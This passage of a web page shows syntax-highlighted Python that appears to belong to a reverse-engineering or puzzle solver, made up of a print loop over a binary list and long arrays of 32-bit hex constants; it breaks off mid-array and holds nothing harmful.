class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">16</span>):</span><br><span class="line">    print(a[i:i+<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">0xc12083c0</span></span><br><span class="line">c2 = <span class="number">0x6809dce2</span></span><br><span class="line">c3 = [<span class="number">0xCDC56A63</span>,<span class="number">0x4EC090F1</span>,<span class="number">0x21EDD1DA</span>,<span class="number">0xC270CEF2</span>,<span class="number">0x2FED34D7</span>,<span class="number">0x83DF5638</span>,<span class="number">0xD5C182D5</span>,<span class="number">0xBF870104</span>,<span class="number">0x99CC5FB9</span>,<span class="number">0xEDA87ED6</span>,<span class="number">0x3250667D</span>,<span class="number">0x4D98EE5D</span>,<span class="number">0x1F2F3443</span>,<span class="number">0x4BCDEF38</span>,<span class="number">0x0FA6E01C</span>,<span class="number">0xDDDDA728</span>]</span><br><span class="line"></span><br><span class="line">v53 = [<span class="number">0x459FC5A5</span>,<span class="number">0x7FC789F4</span>,<span class="number">0xFBB675AB</span>,<span class="number">0x65917E7D</span>,<span class="number">0xF90902DF</span>,<span class="number">0xAF945AF7</span>,<span class="number">0xA87034DA</span>,<span class="number">0x3AABD494</span>,<span class="number">0x504E015E</span>,<span class="number">0xC96E5B77</span>,<span class="number">0xAFD7CF57</span>,<span class="number">0x2A1948B5</span>,<span class="number">0x7BF2E1AF</span>,<span class="number">0xE89075ED</span>,<span class="number">0x5C0DB5C6</span>,<span class="number">0x6C90C3F3</span>,<span class="number">0x397E24DD</span>,<span class="number">0x262E0C48</span>,<span class="number">0xEBD8BF12</span>,<span class="number">0xA439AC9E</span>,<span class="number">0x791C72BB</span>,<span class="number">0xB7076160</span>,<span class="number">0xAA545E52</span>,<span class="number">0x7D55F11C</span>,<span class="number">0xE9ADA6B6</span>,<span class="number">0x32EAD595</span>,<span class="number">0xC94C2B14</span>,<span class="number">0x2E0BBD9F</span>,<span class="number">0x9AA1A601</span>,<span class="number">0xD02F0B5D</span>,<span class="number">0xD0699D06</span>,<span class="number">0x16A4F9CC</span>,<span class="number">0x2AAA9A3B</span>,<span class="number">0x3507293E</span>,<span class="number">0x82F618CE</span>,<span class="number">0xD8303DDA</span>,<span class="number">0x5E0CB782</span>,<span class="number">0x1AC22EEF</span>,<span class="number">0x5E7FF8F4</span>,<span class="number">0x26CEFC03</span>,<span class="number">0xCDDFBBA8</span>,<span class="number">0x55D80628</span>,<span class="number">0xD5EC1A46</span>,<span class="number">0x1E00E511</span>,<span class="number">0x9B46FC6E</span>,<span class="number">0x2DB1E6E0</span>,<span class="number">0xCBDF9395</span>,<span class="number">0xE00B33D9</span>,<span class="number">0x5A43D50F</span>,<span class="number">0x447DE041</span>,<span class="number">0xC58E5C38</span>,<span class="number">0x1763413E</span>,<span class="number">0x7FE9B647</span>,<span class="number">0xC37B0FB2</span>,<span class="number">0x27A2B087</span>,<span class="number">0x8037A85E</span>,<span class="number">0xF47FEA64</span>,<span class="number">0x592A892F</span>,<span class="number">0xECAD7E7F</span>,<span class="number">0x886AD0FB</span>,<span class="number">0x17B545E7</span>,<span class="number">0xBFB8CD9D</span>,<span class="number">0x5206FAEC</span>,<span class="number">0x205AC34F</span>,<span class="number">0xB9112B48</span>,<span class="number">0x8F64D407</span>,<span class="number">0xA76EBC2F</span>,<span class="number">0x238C306D</span>,<span class="number">0x56D18B07</span>,<span class="number">0xE442447F</span>,<span class="number">0xC0AEB75F</span>,<span class="number">0x8D7ADFDA</span>,<span class="number">0x39872D01</span>,<span class="number">0x07247AE8</span>,<span class="number">0x59DBD0F4</span>,<span class="number">0x985B4AF0</span>,<span class="number">0x09EA38B5</span>,<span class="number">0x9C104491</span>,<span class="number">0x3B135C6D</span>,<span class="number">0xC69E7858</span>,<span class="number">0xE65022F0</span>,<span class="number">0xD9943FF4</span>,<span class="number">0xAABEDF0A</span>,<span class="number">0xB66814B1</span>,<span class="number">0x1F927210</span>,<span class="number">0x9961DD03</span>,<span class="number">0x4BCDC827</span>,<span class="number">0xBB14DD9F</span>,<span class="number">0x40FE24C3</span>,<span class="number">0x5B7FE695</span>,<span class="number">0xB332F95C</span>,<span class="number">0x065262E3</span>,<span class="number">0x2926942D</span>,<span class="number">0x9E53F796</span>,<span class="number">0x7DBFAA45</span>,<span class="number">0x355B70ED</span>,<span class="number">0x672DFA65</span>,<span class="number">0xC5D715B0</span>,<span class="number">0xD885410D</span>,<span class="number">0x5DEA7836</span>,<span class="number">0xD5EA8A92</span>,<span class="number">0xF14E1A6A</span>,<span class="number">0xA02AB37D</span>,<span class="number">0xF5EC3E46</span>,<span class="number">0x9B2D3B45</span>,<span class="number">0xA45D8759</span>,<span class="number">0x5656AC15</span>,<span class="number">0x45001507</span>,<span class="number">0xD0CA4495</span>,<span class="number">0x5C9B0A9A</span>,<span class="number">0xBA41CC1A</span>,<span class="number">0x5B6B7192</span>,<span class="number">0x5B5B0296</span>,<span class="number">0xEB62D7F8</span>,<span class="number">0x63E052B8</span>,<span class="number">0x5E7F661A</span>,<span class="number">0x15F54EB2</span>,<span class="number">0x32BC0DC1</span>,<span class="number">0x757F8AC1</span>,<span class="number">0x4000E44A</span>,<span class="number">0x4C7C3F6D</span>,<span class="number">0x035152D7</span>,<span class="number">0xB215A2FA</span>,<span class="number">0xECF8F423</span>,<span class="number">0x368A6EFB</span>,<span class="number">0xB705DD1F</span>,<span class="number">0xB0EA07D4</span>,<span class="number">0xB6DC6BC9</span>,<span class="number">0x37F9F551</span>,<span class="number">0xF9B6703A</span>,<span class="number">0x7C12AA99</span>,<span class="number">0xA82E5C89</span>,<span class="number">0xC4ABD951</span>,<span class="number">0x0BB24942</span>,<span class="number">0x5106CDF4</span>,<span class="number">0xD20ACB1F</span>,<span class="number">0x0B06A021</span>,<span class="number">0xF5721C2C</span>,<span class="number">0xDC6D6A4D</span>,<span class="number">0xB416E5DB</span>,<span class="number">0x051A2E03</span>,<span class="number">0xE619C398</span>,<span class="number">0x59E2A278</span>,<span class="number">0x75AE0501</span>,<span class="number">0x33DF6E1D</span>,<span class="number">0x7F5F8F1D</span>,<span class="number">0xD3B09DFA</span>,<span class="number">0x5CCEF854</span>,<span class="number">0x353A9751</span>,<span class="number">0x28CDF4C3</span>,<span class="number">0xFA84DF8A</span>,<span class="number">0xB77937F6</span>,<span class="number">0x89DEF60E</span>,<span class="number">0xEF104A33</span>,<span class="number">0x73A9B332</span>,<span class="number">0xA2B958D4</span>,<span class="number">0xB7F11FAE</span>,<span class="number">0xAB10382B</span>,<span class="number">0x610507CB</span>,<span class="number">0xC2494EB2</span>,<span class="number">0x38B0E08C</span>,<span class="number">0xB45BE251</span>,<span class="number">0xB6C9324D</span>,<span class="number">0x50A16213</span>,<span class="number">0xE10FA30C</span>,<span class="number">0xE08F5DA5</span>,<span class="number">0x222F5327</span>,<span class="number">0xF3B44C04</span>,<span class="number">0x01822F6D</span>,<span class="number">0xEC8D1AFB</span>,<span class="number">0x0E77C8F3</span>,<span class="number">0xB94AD1F2</span>,<span class="number">0x7EC184CB</span>,<span class="number">0x8F24309C</span>,<span class="number">0x6BCEE4CF</span>,<span class="number">0xD73B45D7</span>,<span class="number">0x497F0CCD</span>,<span class="number">0x31A6DC74</span>,<span class="number">0x33769D5B</span>,<span class="number">0xD0FAAD9C</span>,<span class="number">0x93247C0E</span>,<span class="number">0xEF989638</span>,<span class="number">0x639429F7</span>,<span class="number">0x347B185A</span>,<span class="number">0xAB662E53</span>,<span class="number">0xADB55832</span>,<span class="number">0x460EAECB</span>,<span class="number">0x4CFF4967</span>,<span class="number">0x32983144</span>,<span class="number">0xBE7C9F6A</span>,<span class="number">0x6572690F</span>,<span class="number">0xB6A44EC6</span>,<span class="number">0x296B626B</span>,<span class="number">0x6F84AC06</span>,<span class="number">0xA4109176</span>,<span class="number">0x09696DA0</span>,<span class="number">0xCF01E53A</span>,<span class="number">0xA2C947B3</span>,<span class="number">0x05018011</span>,<span class="number">0x3C422118</span>,<span class="number">0xC0B3B8FC</span>,<span class="number">0x974DB30E</span>,<span class="number">0x6CAFF180</span>,<span class="number">0x5ED053FF</span>,<span class="number">0x7586923B</span>,<span class="number">0xD18AD289</span>,<span class="number">0x6ADDD492</span>,<span class="number">0x181D1549</span>,<span class="number">0x8565132A</span>,<span class="number">0x11B56CC7</span>,<span class="number">0xFE064E6F</span>,<span class="number">0xED2CEFC0</span>,<span class="number">0x8861E9CF</span>,<span class="number">0x35DE598F</span>,<span class="number">0x1852B4BC</span>,<span class="number">0x5E58E9F7</span>,<span class="number">0xC1EBF4F6</span>,<span class="number">0x006A1A68</span>,<span class="number">0xD6970D50</span>,<span class="number">0x94153D1C</span>,<span class="number">0xC3913B30</span>,<span class="number">0x81CCDFDF</span>,<span class="number">0x4BDA28AF</span>,<span class="number">0xE47E5EF7</span>,<span class="number">0x9EBC1A89</span>,<span class="number">0x3FFD9A1B</span>,<span class="number">0xE6E81C84</span>,<span class="number">0x579CBD80</span>,<span class="number">0x540CDE20</span>,<span class="number">0x3D03D046</span>,<span class="number">0xB30BD041</span>,<span class="number">0x1B47C861</span>,<span class="number">0xB12E9CFB</span>,<span class="number">0xEB89F014</span>,<span class="number">0xD9370AE3</span>,<span class="number">0x80087376</span>,<span class="number">0x65D3550C</span>,<span class="number">0x6E4CDBB7</span>,<span class="number">0x235D3750</span>,<span class="number">0x99B3B43E</span>,<span class="number">0x38FFABD3</span>,<span class="number">0x75C8BC8A</span>,<span class="number">0xFEFA00F1</span>,<span class="number">0xDD8F7F38</span>,<span class="number">0x42DBF66F</span>,<span class="number">0x606BC6B0</span>,<span class="number">0xD00CA499</span>,<span class="number">0xF6BC1178</span>,<span class="number">0x85C2C6BD</span>,<span class="number">0x2DF5F445</span>,<span class="number">0x6BB5EB11</span>,<span class="number">0x8027805B</span>,<span class="number">0xFE6ABACD</span>,<span class="number">0xA782A5C7</span>,<span class="number">0xA5F5B40A</span>,<span class="number">0xAC3F2CA5</span>]</span><br><span class="line">v54 = [<span class="number">0x3B928883</span>,<span class="number">0xA954448B</span>,<span class="number">0xFD81975A</span>,<span class="number">0x59BE145A</span>,<span class="number">0xCE903CCA</span>,<span class="number">0x636CE1F9</span>,<span class="number">0xF1B92DCC</span>,<span class="number">0x2B255DFA</span>,<span class="number">0xF24D3C82</span>,<span class="number">0x391B2517</span>,<span class="number">0x03D670DB</span>,<span class="number">0x5D630DD8</span>,<span class="number">0x50D515CB</span>,<span class="number">0xD21AF9C3</span>,<span class="number">0xC92B08CD</span>,<span class="number">0x9157B9AC</span>,<span class="number">0xB51E501C</span>,<span class="number">0x362812DC</span>,<span class="number">0xBE36DBCB</span>,<span class="number">0x6CB41118</span>,<span class="number">0x61CA6755</span>,<span class="number">0xE477CA36</span>,<span class="number">0xB3DDA664</span>,<span class="number">0x06665D16</span>,<span class="number">0x5B83FA2C</span>,<span class="number">0xF4797850</span>,<span class="number">0x10D61B1C</span>,<span class="number">0xD82BC254</span>,<span class="number">0x17D8A560</span>,<span class="number">0xC281F6A5</span>,<span class="number">0xEC3AE828</span>,<span class="number">0x2905C224</span>,<span class="number">0xD4FE451A</span>,<span class="number">0x43744CEB</span>,<span class="number">0x5E474E9C</span>,<span class="number">0x749BFACD</span>,<span class="number">0xD054E526</span>,<span class="number">0x162C850D</span>,<span class="number">0x72A714E9</span>,<span class="number">0xFE46AC10</span>,<span class="number">0x3487BC05</span>,<span class="number">0x2C8AEA43</span>,<span class="number">0x9E3F2FF8</span>,<span class="number">0x2F0E5C23</span>,<span class="number">0xD3E784C8</span>,<span class="number">0x8E20D985</span>,<span class="number">0x3DA8DF49</span>,<span class="number">0x63AD4B53</span>,<span class="number">0x7C9B3978</span>,<span class="number">0x4FED2F4E</span>,<span class="number">0x252C0D9C</span>,<span class="number">0x5AC1BCBB</span>,<span class="number">0xB4273B2F</span>,<span class="number">0x06F2009C</span>,<span class="number">0x5A5DD8F1</span>,<span class="number">0x59F768E0</span>,<span class="number">0xAC518815</span>,<span class="number">0x2B8F713F</span>,<span class="number">0x2AFD2285</span>,<span class="number">0x0A88492D</span>,<span class="number">0x703974BB</span>,<span class="number">0xE61EBE48</span>,<span class="number">0xEBD57CD3</span>,<span class="number">0xF03CB920</span>,<span class="number">0xB014F855</span>,<span class="number">0x40BB0D0C</span>,<span class="number">0xFABEFE58</span>,<span class="number">0x28E5D18C</span>,<span class="number">0x08CF8517</span>,<span class="number">0x203372AE</span>,<span class="number">0xDF4C9D0C</span>,<span class="number">0x8C387224</span>,<span class="number">0x9213FA25</span>,<span class="number">0x1BE46332</span>,<span class="number">0xE9E8FA1F</span>,<span class="number">0xC5130557</span>,<span class="number">0xFD632B81</span>,<span class="number">0xD7137EAF</span>,<span class="number">0xD1751BF9</span>,<span class="number">0x1ECDB40D</span>,<span class="number">0x04D3ACC6</span>,<span class="number">0x3B3C44CC</span>,<span class="number">0x126F70C6</span>,<span class="number">0xAE14D8DE</span>,<span class="number">0x09249A6B</span>,<span class="number">0x8E602082</span>,<span class="number">0x94EBCD7B</span>,<span class="number">0x93EA6071</span>,<span class="number">0x87CB1D04</span>,<span class="number">0xE48BC7BD</span>,<span class="number">0x6E86AB4B</span>,<span class="number">0x736314FE</span>,<span class="number">0x4F0D819A</span>,<span class="number">0x6A4FA2DE</span>,<span class="number">0xF2284933</span>,<span class="number">0x2FD58EF7</span>,<span class="number">0x1E19833E</span>,<span class="number">0x48AA62F7</span>,<span class="number">0x4A9D931D</span>,<span class="number">0x82BAEBBD</span>,<span class="number">0x22BC1AEE</span>,<span class="number">0xE02E5E94</span>,<span class="number">0x76E42B6E</span>,<span class="number">0x21169B3B</span>,<span class="number">0x78410E1C</span>,<span class="number">0x366D3DBB</span>,<span class="number">0xF7B7AC7B</span>,<span class="number">0x5C12F29C</span>,<span class="number">0x4E271BE5</span>,<span class="number">0x4BAA9AB7</span>,<span class="number">0x2724BF08</span>,<span class="number">0x492AC28F</span>,<span class="number">0x06AD0F63</span>,<span class="number">0xED6B287D</span>,<span class="number">0xEDBCBA48</span>,<span class="number">0x3384877C</span>,<span class="number">0xECBBC030</span>,<span class="number">0xB82E3B2A</span>,<span class="number">0x92160A7C</span>,<span class="number">0xF23874C3</span>,<span class="number">0x75E84887</span>,<span class="number">0x6A2107D4</span>,<span class="number">0xAB01A6E8</span>,<span class="number">0x7232BDA4</span>,<span class="number">0x219FAD2D</span>,<span class="number">0xE016178A</span>,<span class="number">0x61F22009</span>,<span class="number">0x5850B00D</span>,<span class="number">0xC69FEF72</span>,<span class="number">0x79908C67</span>,<span class="number">0x17A0173B</span>,<span class="number">0xC2F925AC</span>,<span class="number">0x560B1C81</span>,<span class="number">0xADF339C4</span>,<span class="number">0x38E19FB8</span>,<span class="number">0xE41D5795</span>,<span class="number">0xCE3A4B81</span>,<span class="number">0x7F152D4B</span>,<span class="number">0x4B238BFC</span>,<span class="number">0x04FC5592</span>,<span class="number">0x5465AC3B</span>,<span class="number">0x3845BF97</span>,<span class="number">0xA658D9F2</span>,<span class="number">0x47E82467</span>,<span class="number">0x986593C9</span>,<span class="number">0x1191C0CB</span>,<span class="number">0x147CC08C</span>,<span class="number">0x496336AE</span>,<span class="number">0xEAE5DA8A</span>,<span class="number">0x7DA03065</span>,<span class="number">0x00B7411D</span>,<span class="number">0x22AB8BD5</span>,<span class="number">0x3CAA62BF</span>,<span class="number">0xB0581433</span>,<span class="number">0x73DD39FB</span>,<span class="number">0x5E9EE883</span>,<span class="number">0xB91A3D18</span>,<span class="number">0xA52B2D1A</span>,<span class="number">0x05834365</span>,<span class="number">0x1F9ED6B2</span>,<span class="number">0xAD3B591B</span>,<span class="number">0x9BDBF823</span>,<span class="number">0x6807BE03</span>,<span class="number">0x0414F751</span>,<span class="number">0xFF70EC21</span>,<span class="number">0xFEB07CBA</span>,<span class="number">0x047690BE</span>,<span class="number">0x603E8BF3</span>,<span class="number">0x16D2BC40</span>,<span class="number">0x572216EF</span>,<span class="number">0x63FF8C4C</span>,<span class="number">0x77991CCE</span>,<span class="number">0x36B2400D</span>,<span class="number">0x9977BDAF</span>,<span class="number">0x04C9621F</span>,<span class="number">0xC37DC00B</span>,<span class="number">0x9CC85CB2</span>,<span class="number">0xC5E01FDE</span>,<span class="number">0x2D75607D</span>,<span class="number">0xA0F556DB</span>,<span class="number">0xC97F64E4</span>,<span class="number">0xB579B604</span>,<span class="number">0x91C35F26</span>,<span class="number">0x21AF8C37</span>,<span class="number">0xB743C7FD</span>,<span class="number">0x12FB7F18</span>,<span class="number">0x885237F5</span>,<span class="number">0x1BBFCC6B</span>,<span class="number">0x5C1FE441</span>,<span class="number">0xBFEF973A</span>,<span class="number">0xEC4676C5</span>,<span class="number">0x4A47CC65</span>,<span class="number">0x971EC8EE</span>,<span class="number">0x3B1DB437</span>,<span class="number">0x5CC8BFB3</span>,<span class="number">0xB6FA47C5</span>,<span class="number">0xF8E4C599</span>,<span class="number">0x475D776B</span>,<span class="number">0xF1CB0976</span>,<span class="number">0xA3C7A932</span>,<span class="number">0xC79A3984</span>,<span class="number">0x084FD354</span>,<span class="number">0xDAE6388B</span>,<span class="number">0x91A70338</span>,<span class="number">0x87CA30E9</span>,<span class="number">0x5DABEF28</span>,<span class="number">0x1EE48985</span>,<span class="number">0xBD7FAEFF</span>,<span class="number">0x44013C1F</span>,<span class="number">0x570FEED8</span>,<span class="number">0x7CB22CD1</span>,<span class="number">0x08311758</span>,<span class="number">0x5AB5DCEB</span>,<span class="number">0xFD96B8B8</span>,<span class="number">0xA80CE023</span>,<span class="number">0x30BBB19D</span>,<span class="number">0x3B33E05A</span>,<span class="number">0xC7649D1E</span>,<span class="number">0x4044428F</span>,<span class="number">0xFE0630C9</span>,<span class="number">0xF656070D</span>,<span class="number">0x303A0A5D</span>,<span class="number">0x16A668B3</span>,<span class="number">0xABB0B40E</span>,<span class="number">0x4ABC9220</span>,<span class="number">0x6038B47F</span>,<span class="number">0x71CF3E0A</span>,<span class="number">0xFC69DAA6</span>,<span class="number">0xFCA9C550</span>,<span class="number">0x17427DEA</span>,<span class="number">0x4DCE3693</span>,<span class="number">0x2361B041</span>,<span class="number">0xD0CCCD10</span>,<span class="number">0x2F270DAF</span>,<span class="number">0x348FA060</span>,<span class="number">0x1177CE40</span>,<span class="number">0x706666B6</span>,<span class="number">0xC329DAF7</span>,<span class="number">0xE3CCA015</span>,<span class="number">0xD6D9596F</span>,<span class="number">0xB2C18EDD</span>,<span class="number">0x25CBE2D3</span>,<span class="number">0xC1A6E67D</span>,<span class="number">0xD9935CF7</span>,<span class="number">0xE3D91858</span>,<span class="number">0xFF9ADE8D</span>,<span class="number">0x4EF7FFD9</span>,<span class="number">0xAABA3CA9</span>,<span class="number">0x8A831B4D</span>,<span class="number">0x1FF14B96</span>,<span class="number">0x9868C966</span>,<span class="number">0x938E9D32</span>,<span class="number">0x4216BFC4</span>,<span class="number">0x7119F0E1</span>,<span class="number">0x592E37B8</span>,<span class="number">0x4BD7DF7C</span>]</span><br><span class="line">v55 = [<span class="number">0x5E476C95</span>,<span class="number">0x03168871</span>,<span class="number">0xEBD956D8</span>,<span class="number">0xFADE7AC3</span>,<span class="number">0xE562A819</span>,<span class="number">0xE68BB4B7</span>,<span class="number">0x0129E1D0</span>,<span class="number">0xBEFBAC4D</span>,<span class="number">0x0C5997B2</span>,<span class="number">0x50EF791A</span>,<span class="number">0x00AD7115</span>,<span class="number">0xC03CF6DD</span>,<span class="number">0xF88F22DD</span>,<span class="number">0x395AF289</span>,<span class="number">0x2D086919</span>,<span class="number">0x64B9435C</span>,<span class="number">0x3D4E53BF</span>,<span class="number">0x26ED3F3A</span>,<span class="number">0x73CD31A6</span>,<span class="number">0x632BCAA9</span>,<span class="number">0x8D9D5141</span>,<span class="number">0xBC20D5E8</span>,<span class="number">0x7CA24F43</span>,<span class="number">0x0EAE0EAB</span>,<span class="number">0xA1D25EBE</span>,<span class="number">0xC66E4A8B</span>,<span class="number">0xEFD2B05F</span>,<span class="number">0xEA54005E</span>,<span class="number">0xBBCAD27C</span>,<span class="number">0x23B477DE</span>,<span class="number">0xE7ACF2EF</span>,<span class="number">0xDA45B6EB</span>,<span class="number">0xA2AB9714</span>,<span class="number">0xE2A9D8E4</span>,<span class="number">0xF7473FD7</span>,<span class="number">0xB79E7CE2</span>,<span class="number">0xB11BD3F7</span>,<span class="number">0x4B979910</span>,<span class="number">0x6ADBAD2A</span>,<span class="number">0xC23C23CA</span>,<span class="number">0x56B858FB</span>,<span class="number">0x8D3D9D78</span>,<span class="number">0x566BEF22</span>,<span class="number">0xF7C4648C</span>,<span class="number">0x270E5502</span>,<span class="number">0xD5153361</span>,<span class="number">0xB46605CA</span>,<span class="number">0xF0EA6E35</span>,<span class="number">0x248AA1D1</span>,<span class="number">0x37A904E7</span>,<span class="number">0xF9C409F8</span>,<span class="number">0xC7D6E847</span>,<span class="number">0x9DB3D65E</span>,<span class="number">0xEEAE0657</span>,<span class="number">0xED4B16E8</span>,<span class="number">0xAB272744</span>,<span class="number">0x8A69915A</span>,<span class="number">0xABF472DB</span>,<span class="number">0x431BAF68</span>,<span class="number">0x5D5A63F1</span>,<span class="number">0x5A241614</span>,<span class="number">0xA6DD595C</span>,<span class="number">0x62377A57</span>,<span class="number">0x2E1AA3AE</span>,<span class="number">0xC6C92EEE</span>,<span class="number">0x628F8657</span>,<span class="number">0x450BCD12</span>,<span class="number">0x19F51364</span>,<span class="number">0x14E560C7</span>,<span class="number">0xA47AF9FB</span>,<span class="number">0x1E9B75E1</span>,<span class="number">0x25C6B3BD</span>,<span class="number">0xEE134C8A</span>,<span class="number">0xED77A7B1</span>,<span class="number">0xA39BC567</span>,<span class="number">0x6249661A</span>,<span class="number">0xB1E1E269</span>,<span class="number">0xD4EEDA36</span>,<span class="number">0x52F1EB18</span>,<span class="number">0x783AB90C</span>,<span class="number">0x4F18A1B5</span>,<span class="number">0x6389A50E</span>,<span class="number">0x4158FF06</span>,<span class="number">0x288D47FA</span>,<span class="number">0x5FED30FD</span>,<span class="number">0x0702EFEE</span>,<span class="number">0x2D7E047E</span>,<span class="number">0x39CA116A</span>,<span class="number">0x1464EA6E</span>,<span class="number">0xEC17671D</span>,<span class="number">0x82461730</span>,<span class="number">0xDA992326</span>,<span class="number">0xA290BC72</span>,<span class="number">0xFE4DD1E1</span>,<span class="number">0x7C151D78</span>,<span class="number">0x896F2FA5</span>,<span class="number">0x7C143A6D</span>,<span class="number">0xEEBB14FD</span>,<span class="number">0x079E59DA</span>,<span class="number">0xB4CAFA56</span>,<span class="number">0xBB10D122</span>,<span class="number">0x0CA116CC</span>,<span class="number">0x5B9C3DDC</span>,<span class="number">0x5C01058E</span>,<span class="number">0xAFDBEC14</span>,<span class="number">0x997D56F4</span>,<span class="number">0x5B5D990A</span>,<span class="number">0x547664C2</span>,<span class="number">0x2F2F0E34</span>,<span class="number">0x3E575455</span>,<span class="number">0x118DD381</span>,<span class="number">0xD5DD373F</span>,<span class="number">0xCFD58F8F</span>,<span class="number">0xDD8414C3</span>,<span class="number">0x2ADE2230</span>,<span class="number">0x7BB8EED7</span>,<span class="number">0x7D578A25</span>,<span class="number">0xD69388CD</span>,<span class="number">0x66610227</span>,<span class="number">0x8EC11A15</span>,<span class="number">0x81E128E1</span>,<span class="number">0xA8C8365E</span>,<span class="number">0xF11A5E70</span>,<span class="number">0x516F9B89</span>,<span class="number">0x579A6702</span>,<span class="number">0x82453EB8</span>,<span class="number">0x3F3A711E</span>,<span class="number">0xA3BAF6BF</span>,<span class="number">0xA6A1E0EB</span>,<span class="number">0xD33DD107</span>,<span class="number">0xC9B45D9D</span>,<span class="number">0xD57C6ABB</span>,<span class="number">0x70951630</span>,<span class="number">0x0DA574F0</span>,<span class="number">0x8C364C1F</span>,<span class="number">0x018E5DB9</span>,<span class="number">0xA1C5517B</span>,<span class="number">0x79FF0653</span>,<span class="number">0x4060D6A9</span>,<span class="number">0x99B1B1C1</span>,<span class="number">0x0BCA6377</span>,<span class="number">0xF84546B2</span>,<span class="number">0x30A65E11</span>,<span class="number">0x286F3FAF</span>,<span class="number">0x15CF5B32</span>,<span class="number">0x21A457FE</span>,<span class="number">0x1B37F262</span>,<span class="number">0x60B7D2FE</span>,<span class="number">0x40BA4178</span>,<span class="number">0xB670B823</span>,<span class="number">0x98F45A98</span>,<span class="number">0x6012AFF7</span>,<span class="number">0xB65FF911</span>,<span class="number">0xEADBA9FE</span>,<span class="number">0x840DDCA9</span>,<span class="number">0x8B8CAF6A</span>,<span class="number">0xB7335C16</span>,<span class="number">0xA15856B7</span>,<span class="number">0xF2056C14</span>,<span class="number">0x74DC21D3</span>,<span class="number">0x2E26E414</span>,<span class="number">0x13515128</span>,<span class="number">0xA3EA4C1C</span>,<span class="number">0x1629376F</span>,<span class="number">0x9E1A8BBC</span>,<span class="number">0x745BFB36</span>,<span class="number">0x3C284848</span>,<span class="number">0x20D7056E</span>,<span class="number">0x9408F410</span>,<span class="number">0xF2EF22A5</span>,<span class="number">0x2AC8CFCF</span>,<span class="number">0xAFB2BC7E</span>,<span class="number">0xB9B33834</span>,<span class="number">0xA2E3ABBB</span>,<span class="number">0x82F760BC</span>,<span class="number">0xA08D613F</span>,<span class="number">0xD993A7DC</span>,<span class="number">0x0398B419</span>,<span class="number">0xF7076946</span>,<span class="number">0xD188A326</span>,<span class="number">0x556AF04D</span>,<span class="number">0xBABC157F</span>,<span class="number">0x1B5DC56F</span>,<span class="number">0xF142CE64</span>,<span class="number">0x8DA31C30</span>,<span class="number">0x47D32FF0</span>,<span class="number">0xC542462D</span>,<span class="number">0xB5C1C5F6</span>,<span class="number">0xAAE1126C</span>,<span class="number">0xA3B8E016</span>,<span class="number">0x4B510673</span>,<span class="number">0x6EE84CBF</span>,<span class="number">0x87729A96</span>,<span class="number">0xF8EA27BA</span>,<span class="number">0x1F727559</span>,<span class="number">0xB0E79D97</span>,<span class="number">0x95676F4A</span>,<span class="number">0xAAA351A2</span>,<span class="number">0x767CCA57</span>,<span class="number">0x60F3EC1C</span>,<span class="number">0x46F6737A</span>,<span class="number">0x3D16D3E7</span>,<span class="number">0x2D73F2D3</span>,<span class="number">0xDC214874</span>,<span class="number">0x29B40C25</span>,<span class="number">0x1959F9EE</span>,<span 